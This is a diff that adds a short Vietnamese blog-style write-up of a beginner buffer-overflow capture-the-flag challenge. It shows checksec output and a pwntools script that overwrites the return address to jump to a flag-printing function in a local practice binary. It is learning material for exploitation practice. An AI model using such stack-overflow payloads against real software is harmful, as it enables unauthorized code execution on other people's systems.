@@ -1,0 +1,40 @@
+Đây là bài viết ví dụ đã được tối ưu lại theo phong cách chuyên nghiệp.
+
+> **Ghi chú của mình:** Bài này mình viết khi đang học về Buffer Overflow. Các phần lời tự sự này sẽ nằm trong khung ghi chú có đường kẻ xanh bên trái để phân biệt với phần kỹ thuật nhé.
+
+## 1. Phân tích thử thách (Analysis)
+
+Kiểm tra cơ chế bảo mật của file:
+`checksec simple_overflow`
+
+![Phân tích bảo mật file binary](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000)
+
+```bash
+[*] '/path/to/simple_overflow'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+## 2. Kỹ thuật khai thác
+
+Vì không có Stack Canary, mình sẽ dùng script Python sau để pwn nó:
+
+```python
+from pwn import *
+
+# Địa chỉ hàm secret dùng để in flag
+secret_addr = 0x4011d6
+
+io = process('./simple_overflow')
+
+# Tạo payload: 40 bytes rác + địa chỉ secret
+payload = b'A' * 40 + p64(secret_addr)
+
+io.sendline(payload)
+io.interactive()
+```
+
+Hy vọng bài viết này giúp ích cho các bạn! Nếu có thắc mắc gì cứ liên hệ mình.
